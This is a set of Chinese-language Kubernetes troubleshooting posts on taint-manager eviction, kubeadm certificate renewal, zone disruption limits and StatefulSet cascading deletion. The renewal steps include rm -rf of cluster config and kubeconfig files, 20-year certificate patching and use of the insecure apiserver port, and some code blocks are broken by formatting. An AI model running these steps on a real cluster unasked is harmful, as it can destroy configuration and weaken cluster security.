<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I0102 07:42:44.106288       1 taint_manager.go:440] Updating known taints on node node2: [&#123;node.kubernetes.io&#x2F;unschedulable  NoExecute &lt;nil&gt;&#125;]</span><br><span class="line">I0102 07:42:44.106350       1 taint_manager.go:352] Not all taints are tolerated after update for Pod kube-system&#x2F;whereabouts-tqxf6 on node2</span><br><span class="line">I0102 07:42:44.106358       1 timed_workers.go:110] Adding TimedWorkerQueue item kube-system&#x2F;whereabouts-tqxf6 at 2022-01-02 07:42:44.106354809 +0000 UTC m&#x3D;+5343.566104243 to be fired at 2022-01-02 07:42:44.106354871 +0000 UTC m&#x3D;+5343.566104306</span><br><span class="line">I0102 07:42:44.106391       1 timed_workers.go:110] Adding TimedWorkerQueue item 67a41957-f57d-4156-ae53-dc796a3c66f2&#x2F;cn0r7j27908mp-0 at 2022-01-02 07:42:44.10634238 +0000 UTC m&#x3D;+5343.566091815 to be fired at 2022-01-02 07:43:14.10634238 +0000 UTC m&#x3D;+5373.566091815</span><br><span class="line">W0102 07:42:44.106398       1 timed_workers.go:115] Trying to add already existing work for &amp;&#123;NamespacedName:67a41957-f57d-4156-ae53-dc796a3c66f2&#x2F;cn0r7j27908mp-0&#125;. Skipping.</span><br></pre></td></tr></table></figure>

<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><ol>
<li>执行操作间隔时间太短，以及taint—manager有多个worker处理该消息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i :&#x3D; 0; i &lt; UpdateWorkerSize; i++ &#123;</span><br><span class="line">	tc.nodeUpdateChannels &#x3D; append(tc.nodeUpdateChannels, make(chan nodeUpdateItem, NodeUpdateChannelSize))</span><br><span class="line">	tc.podUpdateChannels &#x3D; append(tc.podUpdateChannels, make(chan podUpdateItem, podUpdateChannelSize))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Functions that are responsible for taking work items out of the workqueues and putting them</span><br><span class="line">&#x2F;&#x2F; into channels.</span><br><span class="line">go func(stopCh &lt;-chan struct&#123;&#125;) &#123;</span><br><span class="line">	for &#123;</span><br><span class="line">		item, shutdown :&#x3D; tc.nodeUpdateQueue.Get()</span><br><span class="line">		if shutdown &#123;</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line">		nodeUpdate :&#x3D; item.(nodeUpdateItem)</span><br><span class="line">		hash :&#x3D; hash(nodeUpdate.nodeName, UpdateWorkerSize)</span><br><span class="line">		select &#123;</span><br><span class="line">		case &lt;-stopCh:</span><br><span class="line">			tc.nodeUpdateQueue.Done(item)</span><br><span class="line">			return</span><br><span class="line">		case tc.nodeUpdateChannels[hash] &lt;- nodeUpdate:</span><br><span class="line">			&#x2F;&#x2F; tc.nodeUpdateQueue.Done is called by the nodeUpdateChannels worker</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;(stopCh)</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>taint删除pod 成功时，taint 队列也未清除该pod名称<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (q *TimedWorkerQueue) getWrappedWorkerFunc(key string) func(args *WorkArgs) error &#123;</span><br><span class="line">	return func(args *WorkArgs) error &#123;</span><br><span class="line">		err :&#x3D; q.workFunc(args)</span><br><span class="line">		q.Lock()</span><br><span class="line">		defer q.Unlock()</span><br><span class="line">		if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">			&#x2F;&#x2F; To avoid duplicated calls we keep the key in the queue, to prevent</span><br><span class="line">			&#x2F;&#x2F; subsequent additions.</span><br><span class="line">			q.workers[key] &#x3D; nil</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			delete(q.workers, key)</span><br><span class="line">		&#125;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ol>
<ol>
<li>进行删除Pod时，进行尝试删除，删除失败后只是返回error，将该pod从taint队列中移除，等待下一次处理。但是如果没有下一次的事件触发，Pod应该无法被删除了（只是猜测）</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>k8s证书管理</title>
    <url>/2021/03/23/k8s%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="1-K8s集群内置的证书在一年后会到期，导致集群不能正常使用"><a href="#1-K8s集群内置的证书在一年后会到期，导致集群不能正常使用" class="headerlink" title="1.K8s集群内置的证书在一年后会到期，导致集群不能正常使用"></a>1.K8s集群内置的证书在一年后会到期，导致集群不能正常使用</h2><p>证书到期后会提示:Unable to connect to the server: x509: certificate has expired or is not yet valid</p>
<h2 id="2-master-节点"><a href="#2-master-节点" class="headerlink" title="2. master 节点"></a>2. master 节点</h2><p>在默认情况下，可以使用如下命令查看证书过期时间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl x509 -noout -dates -in &#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;apiserver.crt</span><br></pre></td></tr></table></figure>

<p>证书主要存放在/etc/kubernetes/pki 目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@node1 ssl]# ll</span><br><span class="line">total 52</span><br><span class="line">-rw-r--r-- 1 root root 1407 Mar 24 10:07 apiserver.crt</span><br><span class="line">-rw------- 1 root root 1675 Mar 24 10:07 apiserver.key</span><br><span class="line">-rw-r--r-- 1 root root 1099 Mar 24 10:07 apiserver-kubelet-client.crt</span><br><span class="line">-rw------- 1 root root 1679 Mar 24 10:07 apiserver-kubelet-client.key</span><br><span class="line">-rw-r--r-- 1 root root 1025 Jan 18 21:00 ca.crt</span><br><span class="line">-rw------- 1 root root 1679 Jan 18 21:00 ca.key</span><br><span class="line">-rw-r--r-- 1 root root 2401 Mar 24 09:53 cluster.yaml</span><br><span class="line">-rw-r--r-- 1 root root 1038 Jan 18 21:00 front-proxy-ca.crt</span><br><span class="line">-rw------- 1 root root 1679 Jan 18 21:00 front-proxy-ca.key</span><br><span class="line">-rw-r--r-- 1 root root 1058 Mar 24 10:07 front-proxy-client.crt</span><br><span class="line">-rw------- 1 root root 1675 Mar 24 10:07 front-proxy-client.key</span><br><span class="line">-rw------- 1 root root 1679 Jan 18 21:00 sa.key</span><br><span class="line">-rw------- 1 root root  451 Jan 18 21:00 sa.pub</span><br></pre></td></tr></table></figure>

<h2 id="3-集群在有效期内是进行证书续期"><a href="#3-集群在有效期内是进行证书续期" class="headerlink" title="3. 集群在有效期内是进行证书续期"></a>3. 集群在有效期内是进行证书续期</h2><h3 id="3-1-在某个master节点证书续期"><a href="#3-1-在某个master节点证书续期" class="headerlink" title="3.1 在某个master节点证书续期"></a>3.1 在某个master节点证书续期</h3><ol start="0">
<li><p>如果使用已经修改后的kubeadm，可以先将/usr/local/bin 目录下的kubeadm进行备份和替换</p>
</li>
<li><p>备份配置文件和etcd</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -rp &#x2F;etc&#x2F;kubernetes &#x2F;etc&#x2F;kubernetes.bak</span><br><span class="line">cp -r &#x2F;var&#x2F;lib&#x2F;etcd &#x2F;var&#x2F;lib&#x2F;etcd.bak</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>生成集群配置文件,如果证书已经超期了，执行此命令会失败，可以尝试修改节点时间或者使用8080 端口连接api-server获取这些信息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;kubernetes</span><br><span class="line">kubeadm config view &gt; .&#x2F;cluster.yaml</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>使用kubeadm命令进行 证书续期</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubeadm alpha certs renew  apiserver --config&#x3D;.&#x2F;cluster.yaml</span><br><span class="line">kubeadm alpha certs renew  apiserver-kubelet-client --config&#x3D;.&#x2F;cluster.yaml</span><br><span class="line">kubeadm alpha certs renew  front-proxy-client --config&#x3D;.&#x2F;cluster.yaml</span><br></pre></td></tr></table></figure>
<p>执行完毕后，会在目录/etc/kubernetes/pki 生成新的证书，此时再查看证书有效期，会发现证书的有效期已经延长</p>
<ol start="4">
<li>重新生成配置文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -f &#x2F;etc&#x2F;kubernetes&#x2F;*.conf</span><br><span class="line">kubeadm init phase kubeconfig all --config&#x3D;.&#x2F;cluster.yaml</span><br></pre></td></tr></table></figure>

<p>5.重启kubelet、apiserver、controller-manager、scheduler、etcd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps |grep -E &#39;k8s_kube-apiserver|k8s_kube-controller-manager|k8s_kube-scheduler|k8s_etcd_etcd&#39; | awk -F &#39; &#39; &#39;&#123;print $1&#125;&#39; |xargs docker restart</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>复制新的认证文件 用于命令行使用kubectl</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -fr ~&#x2F;.kube&#x2F;</span><br><span class="line">mkdir -p &#x2F;root&#x2F;.kube</span><br><span class="line">cp &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf ~&#x2F;.kube&#x2F;config</span><br></pre></td></tr></table></figure>
<h3 id="3-3-高可用环境其他master节点证书续期"><a href="#3-3-高可用环境其他master节点证书续期" class="headerlink" title="3.3 高可用环境其他master节点证书续期"></a>3.3 高可用环境其他master节点证书续期</h3><ol>
<li>备份配置文件和etcd</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -rp &#x2F;etc&#x2F;kubernetes &#x2F;etc&#x2F;kubernetes.bak</span><br><span class="line">cp -r &#x2F;var&#x2F;lib&#x2F;etcd &#x2F;var&#x2F;lib&#x2F;etcd.bak</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>删除无用的文件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;etc&#x2F;kubernetes&#x2F;*.conf -rf</span><br><span class="line">rm &#x2F;etc&#x2F;kubernetes&#x2F;ssl -rf</span><br></pre></td></tr></table></figure></li>
<li>将master节点的以下信息复制到到计算节点 node53<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r &#x2F;etc&#x2F;kubernetes&#x2F;ssl&#x2F; node53:&#x2F;etc&#x2F;kubernetes</span><br><span class="line">scp  &#x2F;etc&#x2F;kubernetes&#x2F;cluster.yaml node53:&#x2F;etc&#x2F;kubernetes</span><br><span class="line">&#96;&#96;&#96;&#96; </span><br><span class="line">4. 执行命令生成各组件启动需要的配置文件</span><br><span class="line">&#96;&#96;&#96;&#96; </span><br><span class="line"> kubeadm init phase kubeconfig all --config&#x3D;.&#x2F;cluster.yaml</span><br><span class="line">&#96;&#96;&#96;&#96; </span><br><span class="line">5.重启kubelet、apiserver、controller-manager、scheduler、etcd</span><br></pre></td></tr></table></figure>
docker ps |grep -E ‘k8s_kube-apiserver|k8s_kube-controller-manager|k8s_kube-scheduler|k8s_etcd_etcd’ | awk -F ‘ ‘ ‘{print $1}’ |xargs docker restart<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">6. 复制新的认证文件 用于命令行使用kubectl</span><br></pre></td></tr></table></figure>
rm -fr ~/.kube/<br>mkdir -p /root/.kube<br>cp /etc/kubernetes/admin.conf ~/.kube/config<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 3.2 计算节点证书续期</span><br><span class="line">1. 备份配置文件</span><br></pre></td></tr></table></figure>
 cp -rp /etc/kubernetes /etc/kubernetes.bak<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 删除无用的文件</span><br><span class="line">&#96;&#96;&#96;&#96;   </span><br><span class="line">  rm &#x2F;etc&#x2F;kubernetes&#x2F;*.conf -rf</span><br><span class="line">  rm &#x2F;etc&#x2F;kubernetes&#x2F;ssl -rf</span><br></pre></td></tr></table></figure></li>
<li>将master节点的以下信息复制到到计算节点 node53<pre><code>scp -r /etc/kubernetes/ssl/ node53:/etc/kubernetes
scp  /etc/kubernetes/cluster.yaml node53:/etc/kubernetes
</code></pre>
</li>
</ol>
<pre><code>4. 执行命令生成kubelet启动需要的配置文件</code></pre>
<p> kubeadm init phase kubeconfig all –config=./cluster.yaml</p>
<p>````<br> 可以在/etc/kubernetes 目录看到新的配置文件<br>5. 删除 /var/lib/kubelet/pki/kubelet-client-current.pem 文件或者自定义的kubelet存放目录</p>
<ol start="6">
<li>此时执行命令systemctl restart kubelet 重启kubelet就可以</li>
</ol>
<h2 id="4-修改kubeadm源码支持更长的证书有效期"><a href="#4-修改kubeadm源码支持更长的证书有效期" class="headerlink" title="4. 修改kubeadm源码支持更长的证书有效期"></a>4. 修改kubeadm源码支持更长的证书有效期</h2><p>主要修改两块代码，如下所示</p>
<ol>
<li><p>修改一<br>vi staging/src/k8s.io/client-go/util/cert/cert.go,将时间修改为20年，具体的修改位置如下所示：</p>
<p><img src="/2021/03/23/k8s%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86/1.png" alt="avatar"></p>
</li>
</ol>
<ol start="2">
<li><p>修改二<br>vim ./cmd/kubeadm/app/util/pkiutil/pki_helpers.go，将时间修改为20年，具体的修改位置如下所示：</p>
<p><img src="/2021/03/23/k8s%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86/2.png" alt="avatar"></p>
</li>
</ol>
<p>执行命令make WHAT=cmd/kubeadm 重新编译生成kubeadm 可执行文件</p>
<h2 id="5-kubelet-自动续期与controller-manager的证书签发时间"><a href="#5-kubelet-自动续期与controller-manager的证书签发时间" class="headerlink" title="5. kubelet 自动续期与controller-manager的证书签发时间"></a>5. kubelet 自动续期与controller-manager的证书签发时间</h2><p>这里主要有两个参数<br>kubelet 进程接收 –rotate-certificates 参数，该参数决定 kubelet 在当前使用的 证书即将到期时，是否会自动申请新的证书。</p>
<p>kube-controller-manager 进程接收 –cluster-signing-duration 参数 （在 1.19 版本之前为 –experimental-cluster-signing-duration），用来 控制签发证书的有效期限。</p>
]]></content>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>kubernetes nfs pvc</title>
    <url>/2021/01/27/kubernetes-nfs-pvc/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>kubernetes 中zone状态引起的问题</title>
    <url>/2022/01/26/kubernetes-%E4%B8%ADzone%E7%8A%B6%E6%80%81%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>Kubernetes 集群中，在节点异常时(notready)controller-manager中的node_lifecycle_manager会为该节点增加污点，用于驱逐节点的Pod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Taints: </span><br><span class="line">    node.kubernetes.io&#x2F;unreachable:NoExecute</span><br><span class="line">     node.kubernetes.io&#x2F;unreachable:NoSchedule</span><br></pre></td></tr></table></figure>
<p>最近在测试过程中出现，节点notready后，运行在节点的Pod不会被删除，定位发现节点的taint只会存在一个，由于没有Effecf为NoExecute的taint，因此运行在节点的Pod是不会触发驱逐的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Taints: </span><br><span class="line">     node.kubernetes.io&#x2F;unreachable:NoSchedule</span><br></pre></td></tr></table></figure>

<p>调整kube-controller-manager的日志级别为10，集群中有3个计算节点，当2个计算节点异常时，这两个节点能够被正确打上taint，但是当将第三个节点异常时，节点并不会被打上NoExecute的taint。出现了限流的提示，如下所示：<br><img src="/2022/01/26/kubernetes-%E4%B8%ADzone%E7%8A%B6%E6%80%81%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="avatar"></p>
<p>继续向上查看日志，可以看到集群进入了PartialDisruption 状态，此时对节点的处理进行了限流，不再处理这个节点<br><img src="/2022/01/26/kubernetes-%E4%B8%ADzone%E7%8A%B6%E6%80%81%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="avatar"></p>
<p>集群进入statePartialDisruption 状态后，不会再触发节点pod驱逐</p>
<p>看一下源码：目前我们集群没有配置zone信息，默认一个zone，集群节点notready 个数大于55%时，集群进入statePartialDisruption 状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; ComputeZoneState returns a slice of NodeReadyConditions for all Nodes in a given zone.</span><br><span class="line">&#x2F;&#x2F; The zone is considered:</span><br><span class="line">&#x2F;&#x2F; - fullyDisrupted if there&#39;re no Ready Nodes,</span><br><span class="line">&#x2F;&#x2F; - partiallyDisrupted if at least than nc.unhealthyZoneThreshold percent of Nodes are not Ready,</span><br><span class="line">&#x2F;&#x2F; - normal otherwise</span><br><span class="line">func (nc *Controller) ComputeZoneState(nodeReadyConditions []*v1.NodeCondition) (int, ZoneState) &#123;</span><br><span class="line">	readyNodes :&#x3D; 0</span><br><span class="line">	notReadyNodes :&#x3D; 0</span><br><span class="line">	for i :&#x3D; range nodeReadyConditions &#123;</span><br><span class="line">		if nodeReadyConditions[i] !&#x3D; nil &amp;&amp; nodeReadyConditions[i].Status &#x3D;&#x3D; v1.ConditionTrue &#123;</span><br><span class="line">			readyNodes++</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			notReadyNodes++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	switch &#123;</span><br><span class="line">	case readyNodes &#x3D;&#x3D; 0 &amp;&amp; notReadyNodes &gt; 0:</span><br><span class="line">		return notReadyNodes, stateFullDisruption</span><br><span class="line">	case notReadyNodes &gt; 2 &amp;&amp; float32(notReadyNodes)&#x2F;float32(notReadyNodes+readyNodes) &gt;&#x3D; nc.unhealthyZoneThreshold:</span><br><span class="line">		return notReadyNodes, statePartialDisruption</span><br><span class="line">	default:</span><br><span class="line">		return notReadyNodes, stateNormal</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当集群进入statePartialDisruption 状态后，对异常节点的处理调整队列的限流参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         &#x2F;&#x2F;判断集群异常比例，进入statePartialDisruption状态</span><br><span class="line">		&#x2F;&#x2F; We know that there&#39;s at least one not-fully disrupted so,</span><br><span class="line">		&#x2F;&#x2F; we can use default behavior for rate limiters</span><br><span class="line">		for k, v :&#x3D; range nc.zoneStates &#123;</span><br><span class="line">			newState :&#x3D; newZoneStates[k]</span><br><span class="line">			if v &#x3D;&#x3D; newState &#123;</span><br><span class="line">				continue</span><br><span class="line">			&#125;</span><br><span class="line">			klog.V(0).Infof(&quot;Controller detected that zone %v is now in state %v.&quot;, k, newState)</span><br><span class="line">			nc.setLimiterInZone(k, len(zoneToNodeConditions[k]), newState)</span><br><span class="line">			nc.zoneStates[k] &#x3D; newState</span><br><span class="line">		&#125;</span><br><span class="line">&#x2F;&#x2F;当集群进入statePartialDisruption状态后，调整zoneNoExecuteTainter队列的处理速度</span><br><span class="line"> case statePartialDisruption:</span><br><span class="line">		if nc.runTaintManager &#123;</span><br><span class="line">			nc.zoneNoExecuteTainter[zone].SwapLimiter(</span><br><span class="line">				nc.enterPartialDisruptionFunc(zoneSize))</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			nc.zonePodEvictor[zone].SwapLimiter(</span><br><span class="line">				nc.enterPartialDisruptionFunc(zoneSize))</span><br><span class="line">		&#125;       </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不是节点数目大于50的集群，设置QPS为0</span><br><span class="line"> &#x2F;&#x2F; ReducedQPSFunc returns the QPS for when a the cluster is large make</span><br><span class="line">&#x2F;&#x2F; evictions slower, if they&#39;re small stop evictions altogether.</span><br><span class="line">func (nc *Controller) ReducedQPSFunc(nodeNum int) float32 &#123;</span><br><span class="line">	if int32(nodeNum) &gt; nc.largeClusterThreshold &#123;</span><br><span class="line">		return nc.secondaryEvictionLimiterQPS</span><br><span class="line">	&#125;</span><br><span class="line">	return 0</span><br><span class="line">&#125;       </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用flowcontrol.NewFakeNeverRateLimiter()，不再处理队列中的元素</span><br><span class="line">var newLimiter flowcontrol.RateLimiter</span><br><span class="line">	if newQPS &lt;&#x3D; 0 &#123;</span><br><span class="line">		newLimiter &#x3D; flowcontrol.NewFakeNeverRateLimiter()</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		newLimiter &#x3D; flowcontrol.NewTokenBucketRateLimiter(newQPS, EvictionRateLimiterBurst)</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; If we&#39;re currently waiting on limiter, we drain the new one - this is a good approach when Burst value is 1</span><br><span class="line">		&#x2F;&#x2F; TODO: figure out if we need to support higher Burst values and decide on the drain logic, should we keep:</span><br><span class="line">		&#x2F;&#x2F; - saturation (percentage of used tokens)</span><br><span class="line">		&#x2F;&#x2F; - number of used tokens</span><br><span class="line">		&#x2F;&#x2F; - number of available tokens</span><br><span class="line">		&#x2F;&#x2F; - something else</span><br><span class="line">		if q.limiter.TryAccept() &#x3D;&#x3D; false &#123;</span><br><span class="line">			newLimiter.TryAccept()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在小规模集群时，如果还希望异常节点的Pod能够被正确驱逐，可以调整kube-controller-manager的参数unhealthy-zone-threshold=1</p>
]]></content>
  </entry>
  <entry>
    <title>kubernetes apps删除流程</title>
    <url>/2020/11/17/kubernetes-apps%E5%88%A0%E9%99%A4%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>最近遇到了好几个Kubernetes集群出现了删除Statefulset时，Pod未被删除的问题，经过定位是开发同事，基于farbric 的k8s api进行删除statefulset的操作<br>，调用了删除statefulset的接口后，又调用了删除pod的接口，但是都是使用的默认删除方式，非级联删除（Orphan策略），这在某些情况下，可能只是调用了删除statefulset的接口，但是未调用删除Pod的接口，就会<br>出现Pod未被删除的，此时Pod的metadat内可能仍然存在，但是kube-controller-manager中的garbargecollector会将该Pode的ownerreference移除，但是label中仍然带有controller-revision-hash和statefulset的信息，如下图所示<br><img src="/2020/11/17/kubernetes-apps%E5%88%A0%E9%99%A4%E6%B5%81%E7%A8%8B/pod1.png" alt="avatar"></p>
<p>对于正常的属于Statefulset的Pod标识如下所示：</p>
<p><img src="/2020/11/17/kubernetes-apps%E5%88%A0%E9%99%A4%E6%B5%81%E7%A8%8B/pod2.png" alt="avatar"></p>
<p>借此机会对Statefulset删除的源码进行了分析，原以为是由Statefulset-controller 进行控制，但是看了一下代码，发现Statefulset-controller只是用来控制副本数的变化，但是对于Statefulset的删除，并不做任何处理，statefulset-controller的如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; If the StatefulSet is being deleted, don&#39;t do anything other than updating</span><br><span class="line">&#x2F;&#x2F; status.</span><br><span class="line">if set.DeletionTimestamp !&#x3D; nil &#123;</span><br><span class="line">	return &amp;status, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>##Kubernetes资源删除的方式<br>Kubernetes 在删除资源时，存在级联删除和非级联删除<br>###控制垃圾收集器删除 Dependent<br>####级联删除<br>当删除对象时，可以指定是否该对象的 Dependent 也自动删除掉。自动删除 Dependent 也称为级联删除。Kubernetes 中有两种级联删除的模式：background 模式和 foreground 模式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl delete statefulset  -n de2ca8d1-94b4-4faa-8077-e9374ca9db4e 5bagk2rivkjno --cascade&#x3D;true</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Background 级联删除,在 background 级联删除 模式下，Kubernetes 会立即删除 Owner 对象，然后垃圾收集器会在后台删除这些 Dependent。<br>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   curl -X DELETE 127.0.0.1:8080&#x2F;apis&#x2F;extensions&#x2F;v1beta1&#x2F;namespaces&#x2F;default&#x2F;replicasets&#x2F;my-repset \</span><br><span class="line">-d &#39;&#123;&quot;kind&quot;:&quot;DeleteOptions&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;propagationPolicy&quot;:&quot;Background&quot;&#125;&#39; \</span><br><span class="line">-H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure><br>Foreground 级联删除m在 foreground 级联删除 模式下，根对象首先进入 “删除中” 状态。该对象会设置deletionTimestamp 字段对象的 metadata.finalizers 字段包含了值 “foregroundDeletion”，对象仍然可以通过 REST API 可见，一旦被设置为 “删除中” 状态，垃圾收集器会删除对象的所有 Dependent。垃圾收集器删除了所有 “Blocking” 的 Dependent（对象的 ownerReference.blockOwnerDeletion=true）之后，它会删除 Owner 对象。<br>如果一个对象的ownerReferences 字段被一个 Controller（例如 Deployment 或 ReplicaSet）设置，blockOwnerDeletion 会被自动设置，没必要手动修改这个字段。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X DELETE localhost:8080&#x2F;apis&#x2F;extensions&#x2F;v1beta1&#x2F;namespaces&#x2F;default&#x2F;replicasets&#x2F;my-repset \</span><br><span class="line">-d &#39;&#123;&quot;kind&quot;:&quot;DeleteOptions&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;propagationPolicy&quot;:&quot;Foreground&quot;&#125;&#39; \</span><br><span class="line">-H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>

<h4 id="非级联删除"><a href="#非级联删除" class="headerlink" title="非级联删除"></a>非级联删除</h4><p>如果删除对象时，不自动删除它的 Dependent，这些 Dependent 被称作是原对象的 孤儿(Orphan),可以使用以下命令实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl delete statefulset  -n de2ca8d1-94b4-4faa-8077-e9374ca9db4e 5bagk2rivkjno --cascade&#x3D;false</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X DELETE 127.0.0.1:8080&#x2F;apis&#x2F;extensions&#x2F;v1beta1&#x2F;namespaces&#x2F;default&#x2F;replicasets&#x2F;my-repset \</span><br><span class="line">-d &#39;&#123;&quot;kind&quot;:&quot;DeleteOptions&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;propagationPolicy&quot;:&quot;Orphan&quot;&#125;&#39; \</span><br><span class="line">-H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>
<h2 id="Kubernetes-删除apps流程分析"><a href="#Kubernetes-删除apps流程分析" class="headerlink" title="Kubernetes 删除apps流程分析"></a>Kubernetes 删除apps流程分析</h2><p>删除流程中几个重要的过程包括 kube-apiserver 提供的rest服务</p>
<ol>
<li><p>通过调用rest api实现etcd数据库中，app对象的状态更新，包括增加deletetimestamp和finalizer自带，触发更新事件</p>
</li>
<li><p>kube-controller-manager收到了apps状态的更新事件，通过更新内置的graph（集群内资源依赖附属关系的图）和garbagecollector进行资源极其附属的删除，这里是只在etcd数据库删除</p>
</li>
<li><p>kubelet收到第1步中的资源删除事件，进行底层资源的删除和回收</p>
</li>
</ol>
<p>###kube-apiserver<br>kube-apiserver在启动时会基于go-restful将rest服务的handler 进行加载，主要如下所示：<br>pkg/master/master.go</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; InstallAPIs will install the APIs for the restStorageProviders if they are enabled.</span><br><span class="line">func (m *Master) InstallAPIs(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter, restStorageProviders ...RESTStorageProvider) &#123;</span><br><span class="line">	apiGroupsInfo :&#x3D; []*genericapiserver.APIGroupInfo&#123;&#125;</span><br><span class="line"></span><br><span class="line">	for _, restStorageBuilder :&#x3D; range restStorageProviders &#123;</span><br><span class="line">		groupName :&#x3D; restStorageBuilder.GroupName()</span><br><span class="line">		if !apiResourceConfigSource.AnyVersionForGroupEnabled(groupName) &#123;</span><br><span class="line">			klog.V(1).Infof(&quot;Skipping disabled API group %q.&quot;, groupName)</span><br><span class="line">			continue</span><br><span class="line">		&#125;</span><br><span class="line">		apiGroupInfo, enabled :&#x3D; restStorageBuilder.NewRESTStorage(apiResourceConfigSource, restOptionsGetter)</span><br><span class="line">		if !enabled &#123;</span><br><span class="line">			klog.Warningf(&quot;Problem initializing API group %q, skipping.&quot;, groupName)</span><br><span class="line">			continue</span><br><span class="line">		&#125;</span><br><span class="line">		klog.V(1).Infof(&quot;Enabling API group %q.&quot;, groupName)</span><br><span class="line"></span><br><span class="line">		if postHookProvider, ok :&#x3D; restStorageBuilder.(genericapiserver.PostStartHookProvider); ok &#123;</span><br><span class="line">			name, hook, err :&#x3D; postHookProvider.PostStartHook()</span><br><span class="line">			if err !&#x3D; nil &#123;</span><br><span class="line">				klog.Fatalf(&quot;Error building PostStartHook: %v&quot;, err)</span><br><span class="line">			&#125;</span><br><span class="line">			m.GenericAPIServer.AddPostStartHookOrDie(name, hook)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		apiGroupsInfo &#x3D; append(apiGroupsInfo, &amp;apiGroupInfo)</span><br><span class="line">	&#125;</span><br><span class="line">    #集成API</span><br><span class="line">	if err :&#x3D; m.GenericAPIServer.InstallAPIGroups(apiGroupsInfo...); err !&#x3D; nil &#123;</span><br><span class="line">		klog.Fatalf(&quot;Error in registering group versions: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要的调用链：</p>
